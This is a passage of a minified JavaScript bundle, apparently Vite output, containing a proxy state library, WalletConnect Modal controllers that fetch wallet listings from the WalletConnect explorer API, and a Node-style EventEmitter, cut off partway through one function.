(function() {
    const U = document.createElement("link").relList;
    if (U && U.supports && U.supports("modulepreload"))
        return;
    for (const et of document.querySelectorAll('link[rel="modulepreload"]'))
        oe(et);
    new MutationObserver(et => {
        for (const st of et)
            if (st.type === "childList")
                for (const ws of st.addedNodes)
                    ws.tagName === "LINK" && ws.rel === "modulepreload" && oe(ws)
    }
    ).observe(document, {
        childList: !0,
        subtree: !0
    });
    function Z(et) {
        const st = {};
        return et.integrity && (st.integrity = et.integrity),
        et.referrerPolicy && (st.referrerPolicy = et.referrerPolicy),
        et.crossOrigin === "use-credentials" ? st.credentials = "include" : et.crossOrigin === "anonymous" ? st.credentials = "omit" : st.credentials = "same-origin",
        st
    }
    function oe(et) {
        if (et.ep)
            return;
        et.ep = !0;
        const st = Z(et);
        fetch(et.href, st)
    }
}
)();
const scriptRel = "modulepreload"
  , assetsURL = function(q) {
    return "/" + q
}
  , seen = {}
  , __vitePreload = function(U, Z, oe) {
    if (!Z || Z.length === 0)
        return U();
    const et = document.getElementsByTagName("link");
    return Promise.all(Z.map(st => {
        if (st = assetsURL(st),
        st in seen)
            return;
        seen[st] = !0;
        const ws = st.endsWith(".css")
          , ms = ws ? '[rel="stylesheet"]' : "";
        if (!!oe)
            for (let _s = et.length - 1; _s >= 0; _s--) {
                const Is = et[_s];
                if (Is.href === st && (!ws || Is.rel === "stylesheet"))
                    return
            }
        else if (document.querySelector(`link[href="${st}"]${ms}`))
            return;
        const vs = document.createElement("link");
        if (vs.rel = ws ? "stylesheet" : scriptRel,
        ws || (vs.as = "script",
        vs.crossOrigin = ""),
        vs.href = st,
        document.head.appendChild(vs),
        ws)
            return new Promise( (_s, Is) => {
                vs.addEventListener("load", _s),
                vs.addEventListener("error", () => Is(new Error(`Unable to preload CSS for ${st}`)))
            }
            )
    }
    )).then( () => U()).catch(st => {
        const ws = new Event("vite:preloadError",{
            cancelable: !0
        });
        if (ws.payload = st,
        window.dispatchEvent(ws),
        !ws.defaultPrevented)
            throw st
    }
    )
}
  , t = Symbol()
  , s$1 = Object.getPrototypeOf
  , c$4 = new WeakMap
  , l$2 = q => q && (c$4.has(q) ? c$4.get(q) : s$1(q) === Object.prototype || s$1(q) === Array.prototype)
  , y$4 = q => l$2(q) && q[t] || null
  , h$3 = (q, U=!0) => {
    c$4.set(q, U)
}
  , isObject = q => typeof q == "object" && q !== null
  , proxyStateMap = new WeakMap
  , refSet = new WeakSet
  , buildProxyFunction = (q=Object.is, U= (vs, _s) => new Proxy(vs,_s), Z=vs => isObject(vs) && !refSet.has(vs) && (Array.isArray(vs) || !(Symbol.iterator in vs)) && !(vs instanceof WeakMap) && !(vs instanceof WeakSet) && !(vs instanceof Error) && !(vs instanceof Number) && !(vs instanceof Date) && !(vs instanceof String) && !(vs instanceof RegExp) && !(vs instanceof ArrayBuffer), oe=vs => {
    switch (vs.status) {
    case "fulfilled":
        return vs.value;
    case "rejected":
        throw vs.reason;
    default:
        throw vs
    }
}
, et=new WeakMap, st= (vs, _s, Is=oe) => {
    const Ss = et.get(vs);
    if ((Ss == null ? void 0 : Ss[0]) === _s)
        return Ss[1];
    const Ts = Array.isArray(vs) ? [] : Object.create(Object.getPrototypeOf(vs));
    return h$3(Ts, !0),
    et.set(vs, [_s, Ts]),
    Reflect.ownKeys(vs).forEach(Rs => {
        if (Object.getOwnPropertyDescriptor(Ts, Rs))
            return;
        const Ns = Reflect.get(vs, Rs)
          , Hs = {
            value: Ns,
            enumerable: !0,
            configurable: !0
        };
        if (refSet.has(Ns))
            h$3(Ns, !1);
        else if (Ns instanceof Promise)
            delete Hs.value,
            Hs.get = () => Is(Ns);
        else if (proxyStateMap.has(Ns)) {
            const [ha,pa] = proxyStateMap.get(Ns);
            Hs.value = st(ha, pa(), Is)
        }
        Object.defineProperty(Ts, Rs, Hs)
    }
    ),
    Object.preventExtensions(Ts)
}
, ws=new WeakMap, ms=[1, 1], Es=vs => {
    if (!isObject(vs))
        throw new Error("object required");
    const _s = ws.get(vs);
    if (_s)
        return _s;
    let Is = ms[0];
    const Ss = new Set
      , Ts = (Bs, Fa=++ms[0]) => {
        Is !== Fa && (Is = Fa,
        Ss.forEach(Js => Js(Bs, Fa)))
    }
    ;
    let Rs = ms[1];
    const Ns = (Bs=++ms[1]) => (Rs !== Bs && !Ss.size && (Rs = Bs,
    ha.forEach( ([Fa]) => {
        const Js = Fa[1](Bs);
        Js > Is && (Is = Js)
    }
    )),
    Is)
      , Hs = Bs => (Fa, Js) => {
        const Wa = [...Fa];
        Wa[1] = [Bs, ...Wa[1]],
        Ts(Wa, Js)
    }
      , ha = new Map
      , pa = (Bs, Fa) => {
        if (Ss.size) {
            const Js = Fa[3](Hs(Bs));
            ha.set(Bs, [Fa, Js])
        } else
            ha.set(Bs, [Fa])
    }
      , Zs = Bs => {
        var Fa;
        const Js = ha.get(Bs);
        Js && (ha.delete(Bs),
        (Fa = Js[1]) == null || Fa.call(Js))
    }
      , Qa = Bs => (Ss.add(Bs),
    Ss.size === 1 && ha.forEach( ([Js,Wa], Za) => {
        const tl = Js[3](Hs(Za));
        ha.set(Za, [Js, tl])
    }
    ),
    () => {
        Ss.delete(Bs),
        Ss.size === 0 && ha.forEach( ([Js,Wa], Za) => {
            Wa && (Wa(),
            ha.set(Za, [Js]))
        }
        )
    }
    )
      , Ga = Array.isArray(vs) ? [] : Object.create(Object.getPrototypeOf(vs))
      , sl = U(Ga, {
        deleteProperty(Bs, Fa) {
            const Js = Reflect.get(Bs, Fa);
            Zs(Fa);
            const Wa = Reflect.deleteProperty(Bs, Fa);
            return Wa && Ts(["delete", [Fa], Js]),
            Wa
        },
        set(Bs, Fa, Js, Wa) {
            const Za = Reflect.has(Bs, Fa)
              , tl = Reflect.get(Bs, Fa, Wa);
            if (Za && (q(tl, Js) || ws.has(Js) && q(tl, ws.get(Js))))
                return !0;
            Zs(Fa),
            isObject(Js) && (Js = y$4(Js) || Js);
            let za = Js;
            if (Js instanceof Promise)
                Js.then(Ws => {
                    Js.status = "fulfilled",
                    Js.value = Ws,
                    Ts(["resolve", [Fa], Ws])
                }
                ).catch(Ws => {
                    Js.status = "rejected",
                    Js.reason = Ws,
                    Ts(["reject", [Fa], Ws])
                }
                );
            else {
                !proxyStateMap.has(Js) && Z(Js) && (za = Es(Js));
                const Ws = !refSet.has(za) && proxyStateMap.get(za);
                Ws && pa(Fa, Ws)
            }
            return Reflect.set(Bs, Fa, za, Wa),
            Ts(["set", [Fa], Js, tl]),
            !0
        }
    });
    ws.set(vs, sl);
    const el = [Ga, Ns, st, Qa];
    return proxyStateMap.set(sl, el),
    Reflect.ownKeys(vs).forEach(Bs => {
        const Fa = Object.getOwnPropertyDescriptor(vs, Bs);
        "value"in Fa && (sl[Bs] = vs[Bs],
        delete Fa.value,
        delete Fa.writable),
        Object.defineProperty(Ga, Bs, Fa)
    }
    ),
    sl
}
) => [Es, proxyStateMap, refSet, q, U, Z, oe, et, st, ws, ms]
  , [defaultProxyFunction] = buildProxyFunction();
function proxy(q={}) {
    return defaultProxyFunction(q)
}
function subscribe(q, U, Z) {
    const oe = proxyStateMap.get(q);
    let et;
    const st = []
      , ws = oe[3];
    let ms = !1;
    const vs = ws(_s => {
        if (st.push(_s),
        Z) {
            U(st.splice(0));
            return
        }
        et || (et = Promise.resolve().then( () => {
            et = void 0,
            ms && U(st.splice(0))
        }
        ))
    }
    );
    return ms = !0,
    () => {
        ms = !1,
        vs()
    }
}
function snapshot(q, U) {
    const Z = proxyStateMap.get(q)
      , [oe,et,st] = Z;
    return st(oe, et(), U)
}
const state$7 = proxy({
    history: ["ConnectWallet"],
    view: "ConnectWallet",
    data: void 0
})
  , RouterCtrl = {
    state: state$7,
    subscribe(q) {
        return subscribe(state$7, () => q(state$7))
    },
    push(q, U) {
        q !== state$7.view && (state$7.view = q,
        U && (state$7.data = U),
        state$7.history.push(q))
    },
    reset(q) {
        state$7.view = q,
        state$7.history = [q]
    },
    replace(q) {
        state$7.history.length > 1 && (state$7.history[state$7.history.length - 1] = q,
        state$7.view = q)
    },
    goBack() {
        if (state$7.history.length > 1) {
            state$7.history.pop();
            const [q] = state$7.history.slice(-1);
            state$7.view = q
        }
    },
    setData(q) {
        state$7.data = q
    }
}
  , CoreUtil = {
    WALLETCONNECT_DEEPLINK_CHOICE: "WALLETCONNECT_DEEPLINK_CHOICE",
    WCM_VERSION: "WCM_VERSION",
    RECOMMENDED_WALLET_AMOUNT: 9,
    isMobile() {
        return typeof window < "u" ? !!(window.matchMedia("(pointer:coarse)").matches || /Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)) : !1
    },
    isAndroid() {
        return CoreUtil.isMobile() && navigator.userAgent.toLowerCase().includes("android")
    },
    isIos() {
        const q = navigator.userAgent.toLowerCase();
        return CoreUtil.isMobile() && (q.includes("iphone") || q.includes("ipad"))
    },
    isHttpUrl(q) {
        return q.startsWith("http://") || q.startsWith("https://")
    },
    isArray(q) {
        return Array.isArray(q) && q.length > 0
    },
    isTelegram() {
        return typeof window < "u" && (!!window.TelegramWebviewProxy || !!window.Telegram || !!window.TelegramWebviewProxyProto)
    },
    formatNativeUrl(q, U, Z) {
        if (CoreUtil.isHttpUrl(q))
            return this.formatUniversalUrl(q, U, Z);
        let oe = q;
        oe.includes("://") || (oe = q.replaceAll("/", "").replaceAll(":", ""),
        oe = `${oe}://`),
        oe.endsWith("/") || (oe = `${oe}/`),
        this.setWalletConnectDeepLink(oe, Z);
        const et = encodeURIComponent(U);
        return `${oe}wc?uri=${et}`
    },
    formatUniversalUrl(q, U, Z) {
        if (!CoreUtil.isHttpUrl(q))
            return this.formatNativeUrl(q, U, Z);
        let oe = q;
        if (oe.startsWith("https://t.me")) {
            const st = Buffer.from(U).toString("base64").replace(/[=]/g, "");
            oe.endsWith("/") && (oe = oe.slice(0, -1)),
            this.setWalletConnectDeepLink(oe, Z);
            const ws = new URL(oe);
            return ws.searchParams.set("startapp", st),
            ws.toString()
        }
        oe.endsWith("/") || (oe = `${oe}/`),
        this.setWalletConnectDeepLink(oe, Z);
        const et = encodeURIComponent(U);
        return `${oe}wc?uri=${et}`
    },
    async wait(q) {
        return new Promise(U => {
            setTimeout(U, q)
        }
        )
    },
    openHref(q, U) {
        const Z = this.isTelegram() ? "_blank" : U;
        window.open(q, Z, "noreferrer noopener")
    },
    setWalletConnectDeepLink(q, U) {
        try {
            localStorage.setItem(CoreUtil.WALLETCONNECT_DEEPLINK_CHOICE, JSON.stringify({
                href: q,
                name: U
            }))
        } catch {
            console.info("Unable to set WalletConnect deep link")
        }
    },
    setWalletConnectAndroidDeepLink(q) {
        try {
            const [U] = q.split("?");
            localStorage.setItem(CoreUtil.WALLETCONNECT_DEEPLINK_CHOICE, JSON.stringify({
                href: U,
                name: "Android"
            }))
        } catch {
            console.info("Unable to set WalletConnect android deep link")
        }
    },
    removeWalletConnectDeepLink() {
        try {
            localStorage.removeItem(CoreUtil.WALLETCONNECT_DEEPLINK_CHOICE)
        } catch {
            console.info("Unable to remove WalletConnect deep link")
        }
    },
    setModalVersionInStorage() {
        try {
            typeof localStorage < "u" && localStorage.setItem(CoreUtil.WCM_VERSION, "2.7.0")
        } catch {
            console.info("Unable to set Web3Modal version in storage")
        }
    },
    getWalletRouterData() {
        var q;
        const U = (q = RouterCtrl.state.data) == null ? void 0 : q.Wallet;
        if (!U)
            throw new Error('Missing "Wallet" view data');
        return U
    }
}
  , isEnabled = typeof location < "u" && (location.hostname.includes("localhost") || location.protocol.includes("https"))
  , state$6 = proxy({
    enabled: isEnabled,
    userSessionId: "",
    events: [],
    connectedWalletId: void 0
})
  , EventsCtrl = {
    state: state$6,
    subscribe(q) {
        return subscribe(state$6.events, () => q(snapshot(state$6.events[state$6.events.length - 1])))
    },
    initialize() {
        state$6.enabled && typeof (crypto == null ? void 0 : crypto.randomUUID) < "u" && (state$6.userSessionId = crypto.randomUUID())
    },
    setConnectedWalletId(q) {
        state$6.connectedWalletId = q
    },
    click(q) {
        if (state$6.enabled) {
            const U = {
                type: "CLICK",
                name: q.name,
                userSessionId: state$6.userSessionId,
                timestamp: Date.now(),
                data: q
            };
            state$6.events.push(U)
        }
    },
    track(q) {
        if (state$6.enabled) {
            const U = {
                type: "TRACK",
                name: q.name,
                userSessionId: state$6.userSessionId,
                timestamp: Date.now(),
                data: q
            };
            state$6.events.push(U)
        }
    },
    view(q) {
        if (state$6.enabled) {
            const U = {
                type: "VIEW",
                name: q.name,
                userSessionId: state$6.userSessionId,
                timestamp: Date.now(),
                data: q
            };
            state$6.events.push(U)
        }
    }
}
  , state$5 = proxy({
    chains: void 0,
    walletConnectUri: void 0,
    isAuth: !1,
    isCustomDesktop: !1,
    isCustomMobile: !1,
    isDataLoaded: !1,
    isUiLoaded: !1
})
  , OptionsCtrl = {
    state: state$5,
    subscribe(q) {
        return subscribe(state$5, () => q(state$5))
    },
    setChains(q) {
        state$5.chains = q
    },
    setWalletConnectUri(q) {
        state$5.walletConnectUri = q
    },
    setIsCustomDesktop(q) {
        state$5.isCustomDesktop = q
    },
    setIsCustomMobile(q) {
        state$5.isCustomMobile = q
    },
    setIsDataLoaded(q) {
        state$5.isDataLoaded = q
    },
    setIsUiLoaded(q) {
        state$5.isUiLoaded = q
    },
    setIsAuth(q) {
        state$5.isAuth = q
    }
}
  , state$4 = proxy({
    projectId: "",
    mobileWallets: void 0,
    desktopWallets: void 0,
    walletImages: void 0,
    chains: void 0,
    enableAuthMode: !1,
    enableExplorer: !0,
    explorerExcludedWalletIds: void 0,
    explorerRecommendedWalletIds: void 0,
    termsOfServiceUrl: void 0,
    privacyPolicyUrl: void 0
})
  , ConfigCtrl = {
    state: state$4,
    subscribe(q) {
        return subscribe(state$4, () => q(state$4))
    },
    setConfig(q) {
        var U, Z;
        EventsCtrl.initialize(),
        OptionsCtrl.setChains(q.chains),
        OptionsCtrl.setIsAuth(!!q.enableAuthMode),
        OptionsCtrl.setIsCustomMobile(!!((U = q.mobileWallets) != null && U.length)),
        OptionsCtrl.setIsCustomDesktop(!!((Z = q.desktopWallets) != null && Z.length)),
        CoreUtil.setModalVersionInStorage(),
        Object.assign(state$4, q)
    }
};
var __defProp$2 = Object.defineProperty
  , __getOwnPropSymbols$2 = Object.getOwnPropertySymbols
  , __hasOwnProp$2 = Object.prototype.hasOwnProperty
  , __propIsEnum$2 = Object.prototype.propertyIsEnumerable
  , __defNormalProp$2 = (q, U, Z) => U in q ? __defProp$2(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , __spreadValues$2 = (q, U) => {
    for (var Z in U || (U = {}))
        __hasOwnProp$2.call(U, Z) && __defNormalProp$2(q, Z, U[Z]);
    if (__getOwnPropSymbols$2)
        for (var Z of __getOwnPropSymbols$2(U))
            __propIsEnum$2.call(U, Z) && __defNormalProp$2(q, Z, U[Z]);
    return q
}
;
const W3M_API = "https://explorer-api.walletconnect.com"
  , SDK_TYPE = "wcm"
  , SDK_VERSION = "js-2.7.0";
async function fetchListings(q, U) {
    const Z = __spreadValues$2({
        sdkType: SDK_TYPE,
        sdkVersion: SDK_VERSION
    }, U)
      , oe = new URL(q,W3M_API);
    return oe.searchParams.append("projectId", ConfigCtrl.state.projectId),
    Object.entries(Z).forEach( ([st,ws]) => {
        ws && oe.searchParams.append(st, String(ws))
    }
    ),
    (await fetch(oe)).json()
}
const ExplorerUtil = {
    async getDesktopListings(q) {
        return fetchListings("/w3m/v1/getDesktopListings", q)
    },
    async getMobileListings(q) {
        return fetchListings("/w3m/v1/getMobileListings", q)
    },
    async getInjectedListings(q) {
        return fetchListings("/w3m/v1/getInjectedListings", q)
    },
    async getAllListings(q) {
        return fetchListings("/w3m/v1/getAllListings", q)
    },
    getWalletImageUrl(q) {
        return `${W3M_API}/w3m/v1/getWalletImage/${q}?projectId=${ConfigCtrl.state.projectId}&sdkType=${SDK_TYPE}&sdkVersion=${SDK_VERSION}`
    },
    getAssetImageUrl(q) {
        return `${W3M_API}/w3m/v1/getAssetImage/${q}?projectId=${ConfigCtrl.state.projectId}&sdkType=${SDK_TYPE}&sdkVersion=${SDK_VERSION}`
    }
};
var __defProp$1 = Object.defineProperty
  , __getOwnPropSymbols$1 = Object.getOwnPropertySymbols
  , __hasOwnProp$1 = Object.prototype.hasOwnProperty
  , __propIsEnum$1 = Object.prototype.propertyIsEnumerable
  , __defNormalProp$1 = (q, U, Z) => U in q ? __defProp$1(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , __spreadValues$1 = (q, U) => {
    for (var Z in U || (U = {}))
        __hasOwnProp$1.call(U, Z) && __defNormalProp$1(q, Z, U[Z]);
    if (__getOwnPropSymbols$1)
        for (var Z of __getOwnPropSymbols$1(U))
            __propIsEnum$1.call(U, Z) && __defNormalProp$1(q, Z, U[Z]);
    return q
}
;
const isMobile = CoreUtil.isMobile()
  , state$3 = proxy({
    wallets: {
        listings: [],
        total: 0,
        page: 1
    },
    search: {
        listings: [],
        total: 0,
        page: 1
    },
    recomendedWallets: []
})
  , ExplorerCtrl = {
    state: state$3,
    async getRecomendedWallets() {
        const {explorerRecommendedWalletIds: q, explorerExcludedWalletIds: U} = ConfigCtrl.state;
        if (q === "NONE" || U === "ALL" && !q)
            return state$3.recomendedWallets;
        if (CoreUtil.isArray(q)) {
            const oe = {
                recommendedIds: q.join(",")
            }
              , {listings: et} = await ExplorerUtil.getAllListings(oe)
              , st = Object.values(et);
            st.sort( (ws, ms) => {
                const Es = q.indexOf(ws.id)
                  , vs = q.indexOf(ms.id);
                return Es - vs
            }
            ),
            state$3.recomendedWallets = st
        } else {
            const {chains: Z, isAuth: oe} = OptionsCtrl.state
              , et = Z == null ? void 0 : Z.join(",")
              , st = CoreUtil.isArray(U)
              , ws = {
                page: 1,
                sdks: oe ? "auth_v1" : void 0,
                entries: CoreUtil.RECOMMENDED_WALLET_AMOUNT,
                chains: et,
                version: 2,
                excludedIds: st ? U.join(",") : void 0
            }
              , {listings: ms} = isMobile ? await ExplorerUtil.getMobileListings(ws) : await ExplorerUtil.getDesktopListings(ws);
            state$3.recomendedWallets = Object.values(ms)
        }
        return state$3.recomendedWallets
    },
    async getWallets(q) {
        const U = __spreadValues$1({}, q)
          , {explorerRecommendedWalletIds: Z, explorerExcludedWalletIds: oe} = ConfigCtrl.state
          , {recomendedWallets: et} = state$3;
        if (oe === "ALL")
            return state$3.wallets;
        et.length ? U.excludedIds = et.map(Is => Is.id).join(",") : CoreUtil.isArray(Z) && (U.excludedIds = Z.join(",")),
        CoreUtil.isArray(oe) && (U.excludedIds = [U.excludedIds, oe].filter(Boolean).join(",")),
        OptionsCtrl.state.isAuth && (U.sdks = "auth_v1");
        const {page: st, search: ws} = q
          , {listings: ms, total: Es} = isMobile ? await ExplorerUtil.getMobileListings(U) : await ExplorerUtil.getDesktopListings(U)
          , vs = Object.values(ms)
          , _s = ws ? "search" : "wallets";
        return state$3[_s] = {
            listings: [...state$3[_s].listings, ...vs],
            total: Es,
            page: st ?? 1
        },
        {
            listings: vs,
            total: Es
        }
    },
    getWalletImageUrl(q) {
        return ExplorerUtil.getWalletImageUrl(q)
    },
    getAssetImageUrl(q) {
        return ExplorerUtil.getAssetImageUrl(q)
    },
    resetSearch() {
        state$3.search = {
            listings: [],
            total: 0,
            page: 1
        }
    }
}
  , state$2 = proxy({
    open: !1
})
  , ModalCtrl = {
    state: state$2,
    subscribe(q) {
        return subscribe(state$2, () => q(state$2))
    },
    async open(q) {
        return new Promise(U => {
            const {isUiLoaded: Z, isDataLoaded: oe} = OptionsCtrl.state;
            if (CoreUtil.removeWalletConnectDeepLink(),
            OptionsCtrl.setWalletConnectUri(q == null ? void 0 : q.uri),
            OptionsCtrl.setChains(q == null ? void 0 : q.chains),
            RouterCtrl.reset("ConnectWallet"),
            Z && oe)
                state$2.open = !0,
                U();
            else {
                const et = setInterval( () => {
                    const st = OptionsCtrl.state;
                    st.isUiLoaded && st.isDataLoaded && (clearInterval(et),
                    state$2.open = !0,
                    U())
                }
                , 200)
            }
        }
        )
    },
    close() {
        state$2.open = !1
    }
};
var __defProp = Object.defineProperty
  , __getOwnPropSymbols = Object.getOwnPropertySymbols
  , __hasOwnProp = Object.prototype.hasOwnProperty
  , __propIsEnum = Object.prototype.propertyIsEnumerable
  , __defNormalProp = (q, U, Z) => U in q ? __defProp(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , __spreadValues = (q, U) => {
    for (var Z in U || (U = {}))
        __hasOwnProp.call(U, Z) && __defNormalProp(q, Z, U[Z]);
    if (__getOwnPropSymbols)
        for (var Z of __getOwnPropSymbols(U))
            __propIsEnum.call(U, Z) && __defNormalProp(q, Z, U[Z]);
    return q
}
;
function isDarkMode() {
    return typeof matchMedia < "u" && matchMedia("(prefers-color-scheme: dark)").matches
}
const state$1 = proxy({
    themeMode: isDarkMode() ? "dark" : "light"
})
  , ThemeCtrl = {
    state: state$1,
    subscribe(q) {
        return subscribe(state$1, () => q(state$1))
    },
    setThemeConfig(q) {
        const {themeMode: U, themeVariables: Z} = q;
        U && (state$1.themeMode = U),
        Z && (state$1.themeVariables = __spreadValues({}, Z))
    }
}
  , state = proxy({
    open: !1,
    message: "",
    variant: "success"
})
  , ToastCtrl = {
    state,
    subscribe(q) {
        return subscribe(state, () => q(state))
    },
    openToast(q, U) {
        state.open = !0,
        state.message = q,
        state.variant = U
    },
    closeToast() {
        state.open = !1
    }
};
class WalletConnectModal {
    constructor(U) {
        this.openModal = ModalCtrl.open,
        this.closeModal = ModalCtrl.close,
        this.subscribeModal = ModalCtrl.subscribe,
        this.setTheme = ThemeCtrl.setThemeConfig,
        ThemeCtrl.setThemeConfig(U),
        ConfigCtrl.setConfig(U),
        this.initUi()
    }
    async initUi() {
        if (typeof window < "u") {
            await __vitePreload( () => import("./index-f492868e.js"), []);
            const U = document.createElement("wcm-modal");
            document.body.insertAdjacentElement("beforeend", U),
            OptionsCtrl.setIsUiLoaded(!0)
        }
    }
}
function getDefaultExportFromCjs(q) {
    return q && q.__esModule && Object.prototype.hasOwnProperty.call(q, "default") ? q.default : q
}
function getAugmentedNamespace(q) {
    if (q.__esModule)
        return q;
    var U = q.default;
    if (typeof U == "function") {
        var Z = function oe() {
            return this instanceof oe ? Reflect.construct(U, arguments, this.constructor) : U.apply(this, arguments)
        };
        Z.prototype = U.prototype
    } else
        Z = {};
    return Object.defineProperty(Z, "__esModule", {
        value: !0
    }),
    Object.keys(q).forEach(function(oe) {
        var et = Object.getOwnPropertyDescriptor(q, oe);
        Object.defineProperty(Z, oe, et.get ? et : {
            enumerable: !0,
            get: function() {
                return q[oe]
            }
        })
    }),
    Z
}
var events = {
    exports: {}
}, R$1 = typeof Reflect == "object" ? Reflect : null, ReflectApply = R$1 && typeof R$1.apply == "function" ? R$1.apply : function(U, Z, oe) {
    return Function.prototype.apply.call(U, Z, oe)
}
, ReflectOwnKeys;
R$1 && typeof R$1.ownKeys == "function" ? ReflectOwnKeys = R$1.ownKeys : Object.getOwnPropertySymbols ? ReflectOwnKeys = function(U) {
    return Object.getOwnPropertyNames(U).concat(Object.getOwnPropertySymbols(U))
}
: ReflectOwnKeys = function(U) {
    return Object.getOwnPropertyNames(U)
}
;
function ProcessEmitWarning(q) {
    console && console.warn && console.warn(q)
}
var NumberIsNaN = Number.isNaN || function(U) {
    return U !== U
}
;
function EventEmitter() {
    EventEmitter.init.call(this)
}
events.exports = EventEmitter;
events.exports.once = once;
EventEmitter.EventEmitter = EventEmitter;
EventEmitter.prototype._events = void 0;
EventEmitter.prototype._eventsCount = 0;
EventEmitter.prototype._maxListeners = void 0;
var defaultMaxListeners = 10;
function checkListener(q) {
    if (typeof q != "function")
        throw new TypeError('The "listener" argument must be of type Function. Received type ' + typeof q)
}
Object.defineProperty(EventEmitter, "defaultMaxListeners", {
    enumerable: !0,
    get: function() {
        return defaultMaxListeners
    },
    set: function(q) {
        if (typeof q != "number" || q < 0 || NumberIsNaN(q))
            throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received ' + q + ".");
        defaultMaxListeners = q
    }
});
EventEmitter.init = function() {
    (this._events === void 0 || this._events === Object.getPrototypeOf(this)._events) && (this._events = Object.create(null),
    this._eventsCount = 0),
    this._maxListeners = this._maxListeners || void 0
}
;
EventEmitter.prototype.setMaxListeners = function(U) {
    if (typeof U != "number" || U < 0 || NumberIsNaN(U))
        throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received ' + U + ".");
    return this._maxListeners = U,
    this
}
;
function _getMaxListeners(q) {
    return q._maxListeners === void 0 ? EventEmitter.defaultMaxListeners : q._maxListeners
}
EventEmitter.prototype.getMaxListeners = function() {
    return _getMaxListeners(this)
}
;
EventEmitter.prototype.emit = function(U) {
    for (var Z = [], oe = 1; oe < arguments.length; oe++)
        Z.push(arguments[oe]);
    var et = U === "error"
      , st = this._events;
    if (st !== void 0)
        et = et && st.error === void 0;
    else if (!et)
        return !1;
    if (et) {
        var ws;
        if (Z.length > 0 && (ws = Z[0]),
        ws instanceof Error)
            throw ws;
        var ms = new Error("Unhandled error." + (ws ? " (" + ws.message + ")" : ""));
        throw ms.context = ws,
        ms
    }
    var Es = st[U];
    if (Es === void 0)
        return !1;
    if (typeof Es == "function")
        ReflectApply(Es, this, Z);
    else
        for (var vs = Es.length, _s = arrayClone(Es, vs), oe = 0; oe < vs; ++oe)
            ReflectApply(_s[oe], this, Z);
    return !0
}
;
function _addListener(q, U, Z, oe) {
    var et, st, ws;
    if (checkListener(Z),
    st = q._events,
    st === void 0 ? (st = q._events = Object.create(null),
    q._eventsCount = 0) : (st.newListener !== void 0 && (q.emit("newListener", U, Z.listener ? Z.listener : Z),
    st = q._events),
    ws = st[U]),
    ws === void 0)
        ws = st[U] = Z,
        ++q._eventsCount;
    else if (typeof ws == "function" ? ws = st[U] = oe ? [Z, ws] : [ws, Z] : oe ? ws.unshift(Z) : ws.push(Z),
    et = _getMaxListeners(q),
    et > 0 && ws.length > et && !ws.warned) {
        ws.warned = !0;
        var ms = new Error("Possible EventEmitter memory leak detected. " + ws.length + " " + String(U) + " listeners added. Use emitter.setMaxListeners() to increase limit");
        ms.name = "MaxListenersExceededWarning",
        ms.emitter = q,
        ms.type = U,
        ms.count = ws.length,
        ProcessEmitWarning(ms)
    }
    return q
}
EventEmitter.prototype.addListener = function(U, Z) {
    return _addListener(this, U, Z, !1)
}
;
EventEmitter.prototype.on = EventEmitter.prototype.addListener;
EventEmitter.prototype.prependListener = function(U, Z) {
    return _addListener(this, U, Z, !0)
}
;
function onceWrapper() {
    if (!this.fired)
        return this.target.removeListener(this.type, this.wrapFn),
        this.fired = !0,
        arguments.length === 0 ? this.listener.call(this.target) : this.listener.apply(this.target, arguments)
}
function _onceWrap(q, U, Z) {
    var oe = {
        fired: !1,
        wrapFn: void 0,
        target: q,
        type: U,
        listener: Z
    }
      , et = onceWrapper.bind(oe);
    return et.listener = Z,
    oe.wrapFn = et,
    et
}
EventEmitter.prototype.once = function(U, Z) {
    return checkListener(Z),
    this.on(U, _onceWrap(this, U, Z)),
    this
}
;
EventEmitter.prototype.prependOnceListener = function(U, Z) {
    return checkListener(Z),
    this.prependListener(U, _onceWrap(this, U, Z)),
    this
}
;
EventEmitter.prototype.removeListener = function(U, Z) {
    var oe, et, st, ws, ms;
    if (checkListener(Z),
    et = this._events,
    et === void 0)
        return this;
    if (oe = et[U],
    oe === void 0)
        return this;
    if (oe === Z || oe.listener === Z)
        --this._eventsCount === 0 ? this._events = Object.create(null) : (delete et[U],
        et.removeListener && this.emit("removeListener", U, oe.listener || Z));
    else if (typeof oe != "function") {
        for (st = -1,
        ws = oe.length - 1; ws >= 0; ws--)
            if (oe[ws] === Z || oe[ws].listener === Z) {
                ms = oe[ws].listener,
                st = ws;
                break
            }
        if (st < 0)
            return this;
        st === 0 ? oe.shift() : spliceOne(oe, st),
        oe.length === 1 && (et[U] = oe[0]),
        et.removeListener !== void 0 && this.emit("removeListener", U, ms || Z)
    }
    return this
}
;
EventEmitter.prototype.off = EventEmitter.prototype.removeListener;
EventEmitter.prototype.removeAllListeners = function(U) {
    var Z, oe, et;
    if (oe = this._events,
    oe === void 0)
        return this;
    if (oe.removeListener === void 0)
        return arguments.length === 0 ? (this._events = Object.create(null),
        this._eventsCount = 0) : oe[U] !== void 0 && (--this._eventsCount === 0 ? this._events = Object.create(null) : delete oe[U]),
        this;
    if (arguments.length === 0) {
        var st = Object.keys(oe), ws;
        for (et = 0; et < st.length; ++et)
            ws = st[et],
            ws !== "removeListener" && this.removeAllListeners(ws);
        return this.removeAllListeners("removeListener"),
        this._events = Object.create(null),
        this._eventsCount = 0,
        this
    }
    if (Z = oe[U],
    typeof Z == "function")
        this.removeListener(U, Z);
    else if (Z !== void 0)
        for (et = Z.length - 1; et >= 0; et--)
            this.removeListener(U, Z[et]);
    return this
}
;
function _listeners(q, U, Z) {
    var oe = q._events;
    if (oe === void 0)
        return [];
    var et = oe[U];
    return et === void 0 ? [] : typeof et == "function" ? Z ? [et.listener || et] : [et] : Z ? unwrapListeners(et) : arrayClone(et, et.length)
}
EventEmitter.prototype.listeners = function(U) {
    return _listeners(this, U, !0)
}
;
EventEmitter.prototype.rawListeners = function(U) {
    return _listeners(this, U, !1)
}
;
EventEmitter.listenerCount = function(q, U) {
    return typeof q.listenerCount == "function" ? q.listenerCount(U) : listenerCount.call(q, U)
}
;
EventEmitter.prototype.listenerCount = listenerCount;
function listenerCount(q) {
    var U = this._events;
    if (U !== void 0) {
        var Z = U[q];
        if (typeof Z == "function")
            return 1;
